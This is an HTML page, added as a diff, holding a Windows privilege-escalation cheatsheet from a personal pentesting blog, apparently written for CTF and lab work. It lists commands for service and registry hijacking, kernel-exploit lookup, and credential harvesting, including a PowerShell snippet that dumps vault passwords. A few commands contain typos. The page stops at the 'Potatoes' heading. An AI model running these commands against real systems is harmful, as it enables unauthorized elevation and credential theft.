@@ -1,0 +1,517 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Generic Enumeration Powershell history location: C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt Find interesting files by extension: where.exe /r &lt;base dir&gt; *.ps1 where.exe /r &lt;base dir&gt; .git where.exe /r &lt;base dir&gt; *.bat Note: an interesting base dir could be c:\windows …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="Windows Privilege Escalation Cheatsheet"/>
+  <meta property="og:description" content="Generic Enumeration Powershell history location: C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt Find interesting files by extension: where.exe /r &lt;base dir&gt; *.ps1 where.exe /r &lt;base dir&gt; .git where.exe /r &lt;base dir&gt; *.bat Note: an interesting base dir could be c:\windows …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/privilege-escalation/windows-privilege-escalation-cheatsheet.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="1957-01-01 00:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="Cheatsheet"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; Windows Privilege Escalation Cheatsheet</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="privilege-escalation/windows-privilege-escalation-cheatsheet">Windows Privilege Escalation Cheatsheet</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#generic-enumeration" title="Generic Enumeration">Generic Enumeration</a></li><li><a class="toc-href" href="#kernel-exploits" title="Kernel Exploits">Kernel Exploits</a></li><li><a class="toc-href" href="#service-and-tasks-exploits" title="Service and Tasks Exploits">Service and Tasks Exploits</a></li><li><a class="toc-href" href="#registry-exploits" title="Registry Exploits">Registry Exploits</a></li><li><a class="toc-href" href="#dumping-credentials" title="Dumping Credentials">Dumping Credentials</a></li><li><a class="toc-href" href="#applications-exploits" title="Applications Exploits">Applications Exploits</a></li><li><a class="toc-href" href="#potatoes" title="Potatoes">Potatoes</a></li><li><a class="toc-href" href="#misc" title="Misc">Misc</a><ul><li><a class="toc-href" href="#efs-encryption" title="EFS Encryption">EFS Encryption</a></li></ul></li></ul></div>
+        </div>
+    <h2 id="generic-enumeration">Generic Enumeration</h2>
+<p>Powershell history location:</p>
+<div class="highlight"><pre><span></span><code>C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</code></pre></div>
+<p>Find interesting files by extension:</p>
+<div class="highlight"><pre><span></span><code>where.exe /r &lt;base dir&gt; <span class="gs">*.ps1</span>
+<span class="gs">where.exe /r &lt;base dir&gt; .git</span>
+<span class="gs">where.exe /r &lt;base dir&gt; *</span>.bat
+</code></pre></div>
+<p>Note: an interesting base dir could be <code>c:\windows</code>.</p>
+<p>Run automated checks with various tools:</p>
+<div class="highlight"><pre><span></span><code><span class="c"># Seatbelt</span>
+<span class="p">.\</span><span class="n">Seatbelt</span><span class="p">.</span><span class="n">exe</span> <span class="n">all</span>
+<span class="p">.\</span><span class="n">Seatbelt</span><span class="p">.</span><span class="n">exe</span> <span class="p">&lt;</span><span class="n">specific</span> <span class="n">check</span><span class="p">&gt;</span>
+
+<span class="c"># winPeas - there are also the PowerShell and BAT version</span>
+<span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">Console</span> <span class="p">/</span><span class="n">v</span> <span class="n">VirtualTerminalLevel</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span> <span class="c"># Enables colors in terminal - not needed when running winPeas in a reverse shell</span>
+<span class="p">.\</span><span class="n">winPEASany</span><span class="p">.</span><span class="n">exe</span> <span class="n">quiet</span> <span class="n">cmd</span> <span class="n">fast</span> <span class="c"># Quick scan</span>
+<span class="p">.\</span><span class="n">winPEASany</span><span class="p">.</span><span class="n">exe</span> <span class="n">quiet</span> <span class="n">cmd</span> <span class="p">&lt;</span><span class="n">specific</span> <span class="n">check</span> <span class="n">category</span><span class="p">&gt;</span>
+
+<span class="c"># PowerUp</span>
+<span class="p">.</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+<span class="nb">Invoke-AllChecks</span> <span class="n">-Verbose</span> 
+
+<span class="c"># BeRoot</span>
+<span class="p">.\</span><span class="n">beRoot</span><span class="p">.</span><span class="n">exe</span>
+
+<span class="c"># Privesc</span>
+<span class="nb">Invoke-PrivEsc</span>
+
+<span class="c"># SharpUp</span>
+<span class="p">.\</span><span class="n">SharpUp</span><span class="p">.</span><span class="n">exe</span>
+</code></pre></div>
+<p><strong>Note</strong>: <code>Seatbelt</code> does not actively hunt for privilege escalation misconfigurations but highlight them in the results, providing a better enumeration coverage than the other tools which are more vertical to specific misconfiguration categories.</p>
+<p>Tools references:</p>
+<ul>
+<li><a href="https://github.com/GhostPack/Seatbelt">Seatbelt</a> - <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe">Pre-Compiled Seatbelt</a></li>
+<li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">winPEAS</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a></li>
+<li><a href="https://github.com/AlessandroZ/BeRoot">BeRoot</a></li>
+<li><a href="https://github.com/enjoiz/Privesc">Privesc</a></li>
+<li><a href="https://github.com/GhostPack/SharpUp">SharpUp</a> - <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe">Pre-Compiled SharpUp</a></li>
+</ul>
+<h2 id="kernel-exploits">Kernel Exploits</h2>
+<p>Enumerate Windows version and applied HotFixes:</p>
+<div class="highlight"><pre><span></span><code>systeminfo.exe
+</code></pre></div>
+<p>Enumerate Windows Kernel vulnerabilities whereas a kernel exploit is available with <a href="https://github.com/bitsadmin/wesng">Windows Exploit Suggester</a>:</p>
+<div class="highlight"><pre><span></span><code>python<span class="w"> </span>wes.py<span class="w"> </span>&lt;output<span class="w"> </span>file<span class="w"> </span>from<span class="w"> </span>systeminfo.exe&gt;<span class="w"> </span>-i<span class="w"> </span><span class="s1">'Elevation of Privilege'</span><span class="w"> </span>&mdash;exploits-only
+</code></pre></div>
+<p>Enumerate Windows Kernel Vulnerabilities with <a href="https://github.com/rasta-mouse/Watson">Watson</a>:</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\W</span>atson.exe
+</code></pre></div>
+<p>Some precompiled kernel exploits can be found <a href="https://github.com/SecWiki/windows-kernel-exploits">here</a>.</p>
+<h2 id="service-and-tasks-exploits">Service and Tasks Exploits</h2>
+<p>Enumerate vulnerable services:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># winPEAS</span>
+.<span class="se">\w</span>inPEASany.exe<span class="w"> </span>quiet<span class="w"> </span>servicesinfo
+
+<span class="c1"># SeatBelt</span>
+.<span class="se">\S</span>eatbelt.exe<span class="w"> </span>NonstandardServices
+</code></pre></div>
+<p>List Services:</p>
+<div class="highlight"><pre><span></span><code>sc.exe<span class="w"> </span>query
+</code></pre></div>
+<p>Get current status of a service:</p>
+<div class="highlight"><pre><span></span><code>sc<span class="w"> </span>qc<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;
+</code></pre></div>
+<p>Get current user permissions on a service using <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk">accesschk</a>:</p>
+<div class="highlight"><pre><span></span><code>accesschk.exe<span class="w"> </span>-uwcqv<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;<span class="w"> </span>-accepteula
+</code></pre></div>
+<p>Check permissions on folders and files using:</p>
+<div class="highlight"><pre><span></span><code><span class="n">accesschk</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-uwdq</span> <span class="p">&lt;</span><span class="n">path</span><span class="p">&gt;</span>
+
+<span class="c"># or</span>
+<span class="nb">Get-ACL</span> <span class="p">&lt;</span><span class="n">file</span> <span class="n">path</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">fl</span>
+</code></pre></div>
+<p>Change <code>binPath</code> of a service:</p>
+<div class="highlight"><pre><span></span><code>sc<span class="w"> </span>config<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;<span class="w"> </span><span class="nv">binpath</span><span class="o">=</span><span class="w"> </span><span class="s2">"\"&lt;path to binary&gt;\""</span>
+</code></pre></div>
+<p>Stop and restart a service:</p>
+<div class="highlight"><pre><span></span><code>net<span class="w"> </span>stop<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;
+net<span class="w"> </span>start<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;
+
+<span class="c1"># or</span>
+
+sc.exe<span class="w"> </span>&lt;Target<span class="w"> </span>Computer&gt;<span class="w"> </span>start<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;
+sc.exe<span class="w"> </span>&lt;Target<span class="w"> </span>Computer&gt;<span class="w"> </span>stop<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;
+</code></pre></div>
+<p>Create a service:</p>
+<div class="highlight"><pre><span></span><code>sc.exe<span class="w"> </span><span class="se">\\</span>&lt;target<span class="w"> </span>computer&gt;<span class="w"> </span>create<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;<span class="w"> </span><span class="nv">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;exe path&gt;"</span><span class="w"> </span><span class="nv">start</span><span class="o">=</span><span class="w"> </span>auto
+</code></pre></div>
+<p>Delete a service:</p>
+<div class="highlight"><pre><span></span><code>sc.exe<span class="w"> </span>&lt;Target<span class="w"> </span>Computer&gt;<span class="w"> </span>delete<span class="w"> </span>&lt;service<span class="w"> </span>name&gt;
+</code></pre></div>
+<p>Get services with unquoted paths and a space in their name:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">select </span><span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where </span><span class="n">-Property</span> <span class="n">PathName</span> <span class="o">-NotMatch</span> <span class="n">-Value</span> <span class="s1">'^["'']'</span>  <span class="p">|</span> <span class="nb">Where </span><span class="n">-Property</span> <span class="n">PathName</span> <span class="o">-Match</span> <span class="n">-Value</span> <span class="s2">"\s.+\.(exe|com|bat|cmd|msi|msp|ps1|vbs|vbe|js|jse|wsf|wsc|scr|cpl|hta|dll|ocx|sys|pif|scf|gadget|lnk|url|drv|appref-ms|reg|inf|isp|pyd)"</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>cmd<span class="w"> </span>/c<span class="w"> </span>wiwmic<span class="w"> </span>service<span class="w"> </span>get<span class="w"> </span>name,displayname,pathname,startmode<span class="w"> </span><span class="p">|</span>findstr<span class="w"> </span>/i<span class="w"> </span><span class="s2">"auto"</span><span class="w"> </span><span class="p">|</span>findstr<span class="w"> </span>/i<span class="w"> </span>/v<span class="w"> </span><span class="s2">"c:\ndows\\"</span><span class="w"> </span><span class="p">|</span>findstr<span class="w"> </span>/i<span class="w"> </span>/v<span class="w"> </span><span class="s2">"""</span>
+</code></pre></div>
+<p>Get services whose current user can modify the current configuration (<code>PowerUp</code>):</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-ModifiableService</span> <span class="n">-Verbose</span>
+</code></pre></div>
+<p>Get permissions on registry entries:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-ACL</span> <span class="p">&lt;</span><span class="n">registry</span><span class="p">&gt;:&lt;</span><span class="n">registry</span> <span class="n">entry</span> <span class="n">path</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">fl</span>
+<span class="nb">Get-Acl</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\&lt;</span><span class="n">service</span> <span class="n">name</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">Format-List</span>
+</code></pre></div>
+<p>Enumerate possibly misconfigured registry entries for services:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$InterestingPermissions</span> <span class="p">=</span> <span class="s2">"FullControl"</span>
+<span class="nv">$IgnoredIdentityReference</span> <span class="p">=</span> <span class="s2">"APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES"</span><span class="p">,</span> <span class="s2">"CREATOR OWNER"</span><span class="p">,</span> <span class="s2">"NT AUTHORITY\SYSTEM"</span><span class="p">,</span> <span class="s2">"BUILTIN\Administrators"</span><span class="p">,</span> <span class="s2">"NT SERVICE\TrustedInstaller"</span>
+<span class="nv">$AllServicesRegEntries</span> <span class="p">=</span> <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span> 
+
+
+<span class="k">ForEach</span> <span class="p">(</span><span class="nv">$RegEntry</span> <span class="k">in</span> <span class="nv">$AllServicesRegEntries</span><span class="p">){</span>
+    <span class="nv">$FormattedRegPath</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$RegEntry</span><span class="p">.</span><span class="n">Name</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s1">'HKEY_LOCAL_MACHINE'</span><span class="p">,</span><span class="s1">'HKLM:'</span><span class="p">)</span>
+    <span class="nv">$acls</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ACL</span> <span class="nv">$FormattedRegPath</span><span class="p">).</span><span class="n">Access</span>
+    <span class="k">ForEach</span> <span class="p">(</span><span class="nv">$acl</span> <span class="k">in</span> <span class="nv">$acls</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">((</span><span class="nv">$InterestingPermissions</span><span class="p">.</span><span class="n">Contains</span><span class="p">(</span><span class="nv">$acl</span><span class="p">.</span><span class="n">RegistryRights</span><span class="p">))</span> <span class="o">-and</span> <span class="p">(!</span><span class="nv">$IgnoredIdentityReference</span><span class="p">.</span><span class="n">Contains</span><span class="p">(</span><span class="nv">$acl</span><span class="p">.</span><span class="n">IdentityReference</span><span class="p">.</span><span class="n">Value</span><span class="p">))){</span>
+            <span class="nb">Write-Host</span> <span class="s2">"[!] Found: $FormattedRegPath - </span><span class="p">$(</span><span class="nv">$acl</span><span class="p">.</span><span class="n">RegistryRights</span><span class="p">)</span><span class="s2"> for </span><span class="p">$(</span><span class="nv">$acl</span><span class="p">.</span><span class="n">IdentityReference</span><span class="p">)</span><span class="s2">"</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Edit service binary from registry:</p>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>add<span class="w"> </span>&lt;service<span class="w"> </span>registry<span class="w"> </span>path&gt;<span class="w"> </span>/v<span class="w"> </span>ImagePath<span class="w"> </span>/t<span class="w"> </span>REG_EXPAND_SZ<span class="w"> </span>/d<span class="w"> </span>&lt;new<span class="w"> </span>binary<span class="w"> </span>path&gt;<span class="w"> </span>/f
+</code></pre></div>
+<p>Get services where the current user can write to its binary path or change arguments to the binary (<code>PowerUp</code>): </p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-ModifiableServiceFile</span> <span class="n">-Verbose</span>
+</code></pre></div>
+<p>List scheduled tasks visible to current user:</p>
+<div class="highlight"><pre><span></span><code>schtasks<span class="w"> </span>/query<span class="w"> </span>/fo<span class="w"> </span>LIST<span class="w"> </span>/v
+</code></pre></div>
+<p>List scheduled tasks excluding system's tasks:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">TaskPath</span> <span class="o">-notlike</span> <span class="s2">"\Microsoft*"</span><span class="p">}</span> <span class="p">|</span> <span class="nb">ft </span><span class="n">TaskName</span><span class="p">,</span><span class="n">TaskPath</span><span class="p">,</span><span class="n">State</span>
+</code></pre></div>
+<p>Get actions in a scheduled task:</p>
+<div class="highlight"><pre><span></span><code><span class="p">(</span><span class="nb">Get-ScheduledTask</span> <span class="n">-TaskName</span> <span class="p">&lt;</span><span class="n">task</span> <span class="n">name</span><span class="p">&gt;).</span><span class="n">Actions</span>
+</code></pre></div>
+<h2 id="registry-exploits">Registry Exploits</h2>
+<p>Enumerate AutoRun executables:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># winPEAS</span>
+winPEASany.exe<span class="w"> </span>quiet<span class="w"> </span>applicationsinfo
+
+<span class="c1"># Manually</span>
+reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un
+<span class="c1">## Check privileges</span>
+Get-Acl<span class="w"> </span>&lt;Autorun<span class="w"> </span>executable&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>Format-List
+</code></pre></div>
+<p>Enumerate <code>AlwaysInstallElevated</code> registries:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># winPEAS</span>
+winPEASany.exe<span class="w"> </span>quiet<span class="w"> </span>windowscreds
+
+<span class="c1"># Manually</span>
+reg<span class="w"> </span>query<span class="w"> </span>HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller<span class="w"> </span>/v<span class="w"> </span>AlwaysInstallElevated
+reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller<span class="w"> </span>/v<span class="w"> </span>AlwaysInstallElevated
+</code></pre></div>
+<p>Run a MSI installer:</p>
+<div class="highlight"><pre><span></span><code>msiexec<span class="w"> </span>/quiet<span class="w"> </span>/qn<span class="w"> </span>/i<span class="w"> </span>&lt;msi<span class="w"> </span>path&gt;
+</code></pre></div>
+<h2 id="dumping-credentials">Dumping Credentials</h2>
+<p>Use winPEAS to check common password locations:</p>
+<div class="highlight"><pre><span></span><code>.<span class="se">\w</span>inPEASany.exe<span class="w"> </span>quiet<span class="w"> </span>filesinfo<span class="w"> </span>userinfo
+.<span class="se">\w</span>inPEASany.exe<span class="w"> </span>quiet<span class="w"> </span>cmd<span class="w"> </span>searchfast<span class="w"> </span>filesinfo
+</code></pre></div>
+<p>Use winPEAS to check for saved credentials:</p>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">winPEASany</span><span class="p">.</span><span class="n">exe</span> <span class="n">quiet</span> <span class="n">cmd</span> <span class="n">windowscreds</span>
+</code></pre></div>
+<p>Check for <strong>AutoLogon</strong> credentials in registry:</p>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>query<span class="w"> </span><span class="s2">"HKLM\Software\Microsoft\WindowsNT\CurrentVersion\winlogon"</span>
+</code></pre></div>
+<p>Check for stored Putty sessions credentials in registry:
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s</p>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>query<span class="w"> </span><span class="s2">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span><span class="w"> </span>/s
+</code></pre></div>
+<p>Search for clear-text passwords in registers:</p>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s
+reg<span class="w"> </span>query<span class="w"> </span>HKCU<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s
+</code></pre></div>
+<p>where:</p>
+<ul>
+<li><code>/f</code> specifies the keyword to search in registers.</li>
+</ul>
+<p>Search credentials in the Windows Credentials Manager (<strong>password ARE NOT shown</strong>):</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># list vaults</span>
+vaultcmd<span class="w"> </span>/list
+
+<span class="c1"># list properties of a vault</span>
+VaultCmd<span class="w"> </span>/listproperties:<span class="s2">"&lt;vault name&gt;"</span>
+
+<span class="c1"># list credentials in a vault</span>
+VaultCmd<span class="w"> </span>/listcreds:<span class="s2">"&lt;vault name&gt;"</span>
+</code></pre></div>
+<p>Dump credentials in the <strong>WebCredentials</strong> vault (see <a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1">there</a>):</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$ClassHolder</span> <span class="p">=[</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span><span class="p">,</span><span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">,</span><span class="n">ContentType</span><span class="p">=</span><span class="n">WindowsRuntime</span><span class="p">]</span>
+<span class="nv">$VaultObj</span> <span class="p">=</span> <span class="nb">new-object</span> <span class="n">Windows</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Credentials</span><span class="p">.</span><span class="n">PasswordVault</span>
+<span class="nv">$VaultObj</span><span class="p">.</span><span class="n">RetrieveAll</span><span class="p">()</span> <span class="p">|</span> <span class="k">foreach</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">RetrievePassword</span><span class="p">();</span> <span class="nv">$_</span> <span class="p">}</span>
+</code></pre></div>
+<p>List and use stored credentials with <code>runas</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># List available stored credentials </span>
+cmdkey<span class="w"> </span>/list
+
+<span class="c1"># Use store credentials</span>
+runas<span class="w"> </span>/savecred<span class="w"> </span>/user:&lt;user<span class="w"> </span>listed<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>previous<span class="w"> </span>command&gt;<span class="w"> </span>cmd.exe
+</code></pre></div>
+<p>Search for possibly interesting configuration files (might produce really noisy output):</p>
+<div class="highlight"><pre><span></span><code>dir<span class="w"> </span>/s<span class="w"> </span>*pass*<span class="w"> </span><span class="o">==</span><span class="w"> </span>*.config
+</code></pre></div>
+<p>Recursively search for possible interesting files containing the keyword "password" (might produce really noisy output):</p>
+<div class="highlight"><pre><span></span><code>findstr<span class="w"> </span>/si<span class="w"> </span>password<span class="w"> </span>*.xml<span class="w"> </span>*.ini<span class="w"> </span>*.txt
+</code></pre></div>
+<p>Look for configuration files or files containing password in the following backup directories:</p>
+<ul>
+<li><code>C:\Windows\Repair</code></li>
+<li><code>C:\Windows\System32\config\RegBack</code></li>
+<li><code>C:\Windows\Panther\Unattend.xml</code></li>
+<li><code>C:\Windows\Panther\Autounattend.xml</code></li>
+</ul>
+<p><strong>Take a also a look to <a href="https://ojack69.github.io/jacks-corner/ad/cheatsheet.html#dumping-credentials">Active Directory Cheatsheet - Dumping Credentials</a>.</strong></p>
+<h2 id="applications-exploits">Applications Exploits</h2>
+<p>In the "file browse" windows for a GUI app running with elevated privileges insert the following to spawn an elevated cmd:</p>
+<div class="highlight"><pre><span></span><code>file://c:/windows/system32/cmd.exe
+</code></pre></div>
+<p>Create a shortcut (<code>.lnk</code>) using PowerShell:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$WshShell</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-COMObject</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span>
+<span class="nv">$Shortcut</span> <span class="p">=</span> <span class="nv">$WshShell</span><span class="p">.</span><span class="n">CreateShortcut</span><span class="p">(</span><span class="s2">"&lt;destination .lnk file&gt;"</span><span class="p">)</span>
+<span class="nv">$Shortcut</span><span class="p">.</span><span class="n">TargetPath</span> <span class="p">=</span> <span class="s2">"&lt;target executable path&gt;"</span>
+<span class="nv">$Shortcut</span><span class="p">.</span><span class="n">Save</span><span class="p">()</span>
+</code></pre></div>
+<p>Create a shortcut (<code>.lnk</code>) using Visual Basic Script:</p>
+<div class="highlight"><pre><span></span><code>Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "&lt;destination .lnk file&gt;"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "&lt;target executable path&gt;"
+oLink.Save
+</code></pre></div>
+<p>Run a <code>.vbs</code> file from cmd:</p>
+<div class="highlight"><pre><span></span><code>cscript<span class="w"> </span>&lt;vbs<span class="w"> </span>path&gt;
+</code></pre></div>
+<p>List running processes:</p>
+<div class="highlight"><pre><span></span><code>tasklist<span class="w"> </span>/v
+</code></pre></div>
+<p>Enumerate nonstandard processes:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Searbelt</span>
+.<span class="se">\s</span>eatbelt.exe<span class="w"> </span>NonstandardProcesses
+
+<span class="c1"># winPEAS</span>
+.<span class="se">\w</span>inPEASany.exe<span class="w"> </span>quiet<span class="w"> </span>procesinfo
+</code></pre></div>
+<h2 id="potatoes">Potatoes</h2>
